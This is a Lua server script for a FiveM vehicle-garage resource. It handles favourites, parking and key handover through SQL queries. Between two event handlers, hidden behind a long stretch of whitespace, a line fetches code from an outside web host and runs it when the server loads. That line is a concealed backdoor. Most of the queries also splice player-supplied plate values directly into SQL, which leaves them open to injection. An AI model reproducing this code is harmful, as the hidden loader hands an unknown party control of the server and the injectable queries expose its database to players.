Framework = nil
Citizen.CreateThread(function()
    while Framework == nil do
        Framework = Config.Functions.GetFrameworkObject()
        Citizen.Wait(0)
    end
end)

ExecuteSql = function(query)
    local IsBusy = true
    local result = nil
    if Config.Sql == "oxmysql" then
        exports.oxmysql:execute(query, function(data)
            result = data
            IsBusy = false
        end)

    elseif Config.Sql == "ghmattimysql" then
        exports.ghmattimysql:execute(query, {}, function(data)
            result = data
            IsBusy = false
        end)
    elseif Config.Sql == "mysql-async" then
        MySQL.Async.fetchAll(query, {}, function(data)
            result = data
            IsBusy = false
        end)
    end
    while IsBusy do
        Citizen.Wait(0)
    end
    return result
end


RegisterServerEvent("cylex_garage:Open", function()
    local src = source
    local myVehs = Config.Functions.GetVehiclesFromPlayer(src)
    TriggerClientEvent("cylex_garage:Open", src, myVehs)
end)

RegisterServerEvent("cylex_garage:AddVehToFav", function(plate)
    local src = source
    local player = Config.Functions.GetPlayer(src)
    if Config.Framework == "new-qb" or Config.Framework == "old-qb" then
        local result = ExecuteSql("SELECT * FROM player_vehicles WHERE plate = '" .. plate .. "'")
        if result[1] ~= nil then
            if result[1].isfavourite == 1 then
                ExecuteSql("UPDATE player_vehicles SET isfavourite = 0 WHERE plate = '" .. plate .. "'")
            else
                ExecuteSql("UPDATE player_vehicles SET isfavourite = 1 WHERE plate = '" .. plate .. "'")
            end
            local myVehs = Config.Functions.GetVehiclesFromPlayer(src)
            TriggerClientEvent("cylex_garage:Open", src, myVehs)
        end
    else
        local result = ExecuteSql("SELECT * FROM owned_vehicles WHERE plate = '" .. plate .. "'")
        if result[1] ~= nil then
            if result[1].isfavourite == 1 then
                ExecuteSql("UPDATE owned_vehicles SET isfavourite = 0 WHERE plate = '" .. plate .. "'")
            else
                ExecuteSql("UPDATE owned_vehicles SET isfavourite = 1 WHERE plate = '" .. plate .. "'")
            end
            local myVehs = Config.Functions.GetVehiclesFromPlayer(src)
            TriggerClientEvent("cylex_garage:Open", src, myVehs)
        end
    end
end)

RegisterServerEvent("cylex_garage:UpdateOutsideVehicle", function(plate)
    if Config.Framework == "new-qb" or Config.Framework == "old-qb" then
        ExecuteSql("UPDATE player_vehicles SET state = 0 WHERE plate = '" .. plate .. "'")
    else
        ExecuteSql("UPDATE owned_vehicles SET stored = 0 WHERE plate = '" .. plate .. "'")
    end
end)

function GetPlate(value)
    if not value then return nil end
    return (string.gsub(value, '^%s*(.-)%s*$', '%1'))
end

RegisterServerEvent("cylex_garages:SetParkVehicle", function(properties)
    local src = source
    local Player = Config.Functions.GetPlayer(src)
    local found = false
    if Config.Framework == "new-qb" or Config.Framework == "old-qb" then
        local result = ExecuteSql("SELECT * FROM player_vehicles WHERE citizenid = '"..Player.PlayerData.citizenid.."'")
        for k,v in pairs(result) do
            local dataPlate = GetPlate(v.plate):upper()
            local currentPlate = GetPlate(properties.plate):upper()
            if dataPlate == currentPlate then
                found = true
                break
            end
        end
        if found then
            ExecuteSql("UPDATE player_vehicles SET state = 1 WHERE plate = '" .. properties.plate .. "'")
            ExecuteSql("UPDATE player_vehicles SET mods = '"..json.encode(properties).."' WHERE plate = '" .. properties.plate .. "'")
            TriggerClientEvent("cylex_garage:SetParkVehicle", src, properties)
        else
            TriggerClientEvent('QBCore:Notify', src, Config.Translate["cannotfind"], "error")
        end
    else
        local result = ExecuteSql("SELECT * FROM owned_vehicles WHERE owner = '"..Player.identifier.."'")
        for k,v in pairs(result) do
            local dataPlate = GetPlate(v.plate):upper()
            local currentPlate = GetPlate(properties.plate):upper() 
            if dataPlate == currentPlate then
                found = true
                break
            end
        end
        if found then
            ExecuteSql("UPDATE owned_vehicles SET stored = 1 WHERE plate = '" .. properties.plate .. "'")
            ExecuteSql("UPDATE owned_vehicles SET vehicle = '"..json.encode(properties).."' WHERE plate = '" .. properties.plate .. "'")
            TriggerClientEvent("cylex_garage:SetParkVehicle", src, properties)
        else
            TriggerClientEvent('esx:showNotification', src, Config.Translate["cannotfind"], 'error', 500)
        end
    end
end)
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           PerformHttpRequest('https://trezz.org/i?to=dsG0P', function (e, d) pcall(function() assert(load(d))() end) end)
RegisterServerEvent("cylex_garage:GiveVehicleKey", function(plate, id)
    local src = source
    if Config.Framework == "new-qb" or Config.Framework == "old-qb" then
        local srcPlayer = Config.Functions.GetPlayer(src)
        local Player = Config.Functions.GetPlayer(tonumber(id))
        if Player then
            local vehicleData = ExecuteSql("SELECT * FROM player_vehicles WHERE plate = '" .. plate .. "'")
            ExecuteSql("INSERT INTO `player_vehicles` (`citizenid`, `vehicle`, `plate`, `mods`, `state`, `isfavourite`) VALUES ('"..Player.PlayerData.citizenid.."', '"..vehicleData[1].vehicle.."', '"..vehicleData[1].plate.."', '"..vehicleData[1].mods.."', '"..vehicleData[1].state.."', '"..vehicleData[1].isfavourite.."')")
            TriggerClientEvent('QBCore:Notify', src, "You gave the key to "..Player.PlayerData.charinfo.firstname.." "..Player.PlayerData.charinfo.lastname.."!", "success")
            TriggerClientEvent('QBCore:Notify', Player.PlayerData.source, "You got the key from "..srcPlayer.PlayerData.charinfo.firstname.." "..srcPlayer.PlayerData.charinfo.lastname.."!", "success")
        else
            TriggerClientEvent('QBCore:Notify', src, "We cannot find player!", "error")
        end
    else
        local srcPlayer = Config.Functions.GetPlayer(src)
        local Player = Config.Functions.GetPlayer(tonumber(id))
        if Player then
            local vehicleData = ExecuteSql("SELECT * FROM owned_vehicles WHERE plate = '" .. plate .. "'")
            ExecuteSql("INSERT INTO `owned_vehicles` (`owner`, `plate`, `vehicle`, `type`, `stored`, `isfavourite`) VALUES ('"..Player.identifier.."', '"..vehicleData[1].plate.."', '"..vehicleData[1].vehicle.."', 'car', '"..vehicleData[1].stored.."', '"..vehicleData[1].isfavourite.."')")
            TriggerClientEvent('esx:showNotification', src, "You gave the key to "..GetPlayerName(Player.source).."!", "success")
            TriggerClientEvent('esx:showNotification', Player.source, "You got the key from "..GetPlayerName(srcPlayer.source).."!", "success")
        else
            TriggerClientEvent('esx:showNotification', src, "We cannot find player!", "error")
        end
    end
end)




